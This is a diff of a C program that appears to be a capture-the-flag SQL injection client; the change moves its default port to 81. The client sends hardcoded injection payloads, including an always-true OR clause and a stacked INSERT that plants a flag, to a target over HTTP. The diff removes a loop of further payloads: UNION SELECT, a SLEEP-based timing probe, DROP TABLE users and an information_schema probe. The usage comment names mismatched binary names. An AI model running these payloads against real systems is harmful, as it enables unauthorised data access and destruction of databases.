@@ -1,8 +1,8 @@
 /*
 Usage:
-  1) Compile: gcc 80_http.c -o 80_http
-  2) Run: ./80_http <target> <port>
-  3) Example: ./80_http 127.0.0.1 80
+  1) Compile: gcc 81_http.c -o 81_http
+  2) Run: ./81_https <target> [port] (port is optional, defaults to 81)
+  3) Example: ./81_https 127.0.0.1
 */
 
 #include <stdio.h>
@@ -19,13 +19,12 @@ Usage:
 #endif
 
 int main(int argc, char *argv[]) {
-    /* Increased size to avoid overflow warnings */
     char input[128];
     strcpy(input, "anything' OR '1'='1");
     char query[128];
     sprintf(query, "SELECT * FROM users WHERE name='%s'", input);
 
-    if (argc != 3) {
+    if (argc < 2) {
         printf("Missing arguments. Please see usage at top.\n");
         printf("Vulnerable query (example): %s\n", query);
         return 1;
@@ -40,7 +39,8 @@ int main(int argc, char *argv[]) {
 #endif
 
     char *target = argv[1];
-    int port = atoi(argv[2]);
+    int port = 81;
+    if (argc == 3) port = atoi(argv[2]);
     struct hostent *he = gethostbyname(target);
     if (!he) {
         printf("Host lookup failed.\n");
@@ -105,7 +105,6 @@ int main(int argc, char *argv[]) {
     close(sockfd);
 #endif
 
-    /* Second injection attempt to plant a persistent flag */
     strcpy(input, "anything'); INSERT INTO ctf_flags(flag) VALUES('CTF{EVERLASTING_FLAG}'); -- ");
     sprintf(query, "SELECT * FROM users WHERE name='%s'", input);
 
@@ -155,7 +154,6 @@ int main(int argc, char *argv[]) {
     close(sockfd);
 #endif
 
-    /* Check if the flag was persisted (depends on server) */
     strcpy(input, "anything' OR '1'='1");
     sprintf(query, "SELECT flag FROM ctf_flags");
 
@@ -208,62 +206,6 @@ int main(int argc, char *argv[]) {
     closesocket(sockfd);
 #else
     close(sockfd);
-#endif
-
-    /* Additional advanced injection attempts */
-    const char* injections[] = {
-        "anything' UNION SELECT 1, 'CTF_UNION_FLAG', 'abc' -- ",
-        "anything' AND SLEEP(5) -- ",
-        "anything'; DROP TABLE users; -- ",
-        "anything' AND (SELECT COUNT(*) FROM information_schema.tables) -- "
-    };
-    int i;
-    for (i = 0; i < 4; i++) {
-        strcpy(input, injections[i]);
-        sprintf(query, "SELECT * FROM users WHERE name='%s'", input);
-        sockfd = socket(AF_INET, SOCK_STREAM, 0);
-        if (sockfd < 0) {
-            printf("Socket creation error: %s\n", strerror(errno));
-            continue;
-        }
-        if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0) {
-            printf("Connection error: %s\n", strerror(errno));
-#ifdef _WIN32
-            closesocket(sockfd);
-#else
-            close(sockfd);
-#endif
-            continue;
-        }
-        char requestX[512];
-        sprintf(requestX, "GET /test?user=%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", input, target);
-        if (send(sockfd, requestX, strlen(requestX), 0) < 0) {
-            printf("Send error: %s\n", strerror(errno));
-#ifdef _WIN32
-            closesocket(sockfd);
-#else
-            close(sockfd);
-#endif
-            continue;
-        }
-        char responseX[2048];
-        memset(responseX, 0, sizeof(responseX));
-        int bytesX = recv(sockfd, responseX, sizeof(responseX) - 1, 0);
-        if (bytesX < 0) {
-            printf("Receive error: %s\n", strerror(errno));
-        } else {
-            printf("Advanced injection attempt: %s\n", query);
-            printf("HTTP response:\n%s\n", responseX);
-        }
-#ifdef _WIN32
-        closesocket(sockfd);
-#else
-        close(sockfd);
-#endif
-    }
-
-#ifdef _WIN32
-    WSACleanup();
 #endif
 
     return 0;
